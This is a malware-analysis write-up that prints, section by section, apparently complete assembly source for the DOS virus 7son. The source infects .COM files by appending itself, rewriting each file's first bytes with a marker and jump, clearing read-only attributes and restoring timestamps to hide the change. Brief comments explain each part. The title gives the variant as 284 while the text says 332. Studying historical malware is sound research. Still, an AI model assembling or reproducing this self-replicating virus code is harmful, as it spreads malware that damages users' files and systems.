
# Analysis of Virus.DOS.7son.284

We will analyze the source code of the Virus.DOS.7son.332, here is the detail.

* [COM Version](https://www.virustotal.com/gui/file/c62b56f3e39ee54320b054607659244807b2830f5cef0d40eb30da5666aa86d6/community)
* [EXE Version](https://www.virustotal.com/gui/file/bde7361691ac38329375e9840d3c9e98d5c2a7292d988141017fc7de04a621a7/community)


## Segments and Memory Configuration

```assembly
cseg            segment
                assume  cs:cseg,ds:cseg,es:cseg,ss:cseg

                .RADIX  16
```
- Defines a code segment named `cseg`.
- `assume` associates the segment registers CS, DS, ES, and SS with this segment.
- `.RADIX 16` indicates that literal numbers will be interpreted in hexadecimal.

## Variables and Constants

```assembly
FILELEN         equ     end - start
MINTARGET       equ     1000d
MAXTARGET       equ     -(FILELEN+40)
```
- `FILELEN` is the length of the program, calculated as the difference between the labels `end` and `start`.
- `MINTARGET` and `MAXTARGET` are constants defining the target file sizes.

## Program Start

```assembly
                org     100

begin:          db      4Dh                     ;virus mark
                db      0E9h, 4, 0              ;jump to virus entry
```
- The program starts at address 100h.
- Inserts a virus marker (`4Dh`).
- Inserts a jump instruction (`0E9h`) to the virus entry point.

## Virus Start

```assembly
start:          db      0CDh,  20h, 0, 0

                cld
                mov     si,0100h
                push    si                      ;push new IP on stack
                mov     di,si
                add     si,[si+2]               ;si -> start
```
- Begins the virus code.
- Initializes registers and prepares for the following code.

## Environment Restoration

```assembly
                push    si                      ;restore original begin
                movsw
                movsw
                pop     si

                mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                cwd                             ;clear the flag
                inc     ax
                push    ax
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es
```
- Saves and restores the initial environment.
- Modifies the interrupt vector 24h.

## File Management

```assembly
                lea     dx,[si+(offset ni24 - 0104)]  ;set new int24 vector
                mov     ah,25h
                push    ax
                int     21

                mov     ah,2Fh                  ;get DTA address
                int     21
                push    es
                push    bx

                add     dx,070h                 ;set new DTA address
                mov     ah,1Ah
                int     21
                add     dx,1Eh
                push    dx

                lea     di,[si+(offset generation-0104)]  ;check generation
                cmp     [di],0707h
                jne     verder

                lea     dx,[di+2]               ;7th son of a 7th son!
                mov     ah,09h
                int     21
```
- Sets a new DTA address.
- Checks the generation of the virus.

## Infection Loop

```assembly
verder:         mov     ax,[di]                 ;update generations
                xchg    ah,al
                mov     al,1
                mov     [di],ax

                lea     dx,[di+33d]             ;find first COM-file
                xor     cx,cx
                mov     ah,4Eh
infloop:        int     21
                pop     dx
                jc      stop
```
- Searches for .COM files to infect and updates the generation.

## File Infection

```assembly
                push    dx

                xor     cx,cx                   ;clear read-only attribute
                mov     ax,4301
                int     21
                jc      return1

                mov     ax,3D02h                ;open the file
                int     21
                jc      return1
                xchg    bx,ax

                mov     ax,5700h                ;get file date & time
                int     21
                push    cx
                push    dx

                mov     cx,4                    ;read begin of file
                mov     dx,si
                mov     ah,3fh
                int     21

                cmp     byte ptr [si],4Dh       ;already infected or an EXE?
                je      return2
                cmp     byte ptr [si],5Ah       ;or a weird EXE?
                je      return2

                mov     al,2                    ;go to end of file
                call    seek

                cmp     ax,MAXTARGET            ;check length of file
                jnb     return2
                cmp     ax,MINTARGET
                jbe     return2

                push    ax
                mov     cx,FILELEN              ;write program to end of file
                mov     ah,40h
                int     21
                cmp     ax,cx                   ;are all bytes written?
                pop     ax
                jnz     return2

                xchg    ax,bp
                mov     al,0                    ;go to begin of file
                call    seek

                mov     word ptr [si],0E94Dh    ;write mark and jump-command
                mov     word ptr [si+2],bp
                mov     ah,40h
                int     21

                inc     byte ptr [di]           ;number of next son
```
- Opens files, checks if they are already infected, and if not, infects them.

## Restoration and End of Infection

```assembly
return2:        pop     dx                      ;restore file date & time
                pop     cx
                mov     ax,5701h
                int     21

                mov     ah,3Eh                  ;close the file
                int     21

return1:        mov     ah,4Fh                  ;find next file
                jmp     short infloop

stop:           pop     dx                      ;restore DTA address
                pop     ds
                mov     ah,1Ah
                int     21

                pop     ax                      ;restore int24 vector
                pop     ds
                pop     dx
                int     21

                pop     ax                      ;restore ctrl-break flag
                pop     dx
                int     21

                push    cs
                push    cs
                pop     ds
                pop     es

                ret
```
- Ends the infection and restores the DTA addresses and interrupt vectors.

## Seek Handling

```assembly
seek:           mov     ah,42
                cwd
int21:          xor     cx,cx
                int     21
                mov     cl,4
                mov     dx,si
                ret
```
- Moves the file pointer using interrupt 21h.

## Interrupt Handler 24h

```assembly
ni24:           mov     al,03
                iret
```
- Interrupt handler for int24.

## Data

```assembly
generation      db      1,1
sontxt          db      'Seventh son of a seventh son',0Dh, 0Ah, '$'
filename        db      '*.COM',0
                db      '‚¨°³±'

end:
```
- Defines data for generation, a message, and filenames.

## End of Segment

```assembly
cseg            ends
                end     begin
```
- Ends the segment and the program.

---

In summary, this assembly program is an example of a virus that infects .COM files. It manipulates DOS interrupts to control files and propagates itself by appending its code to the end of target files.
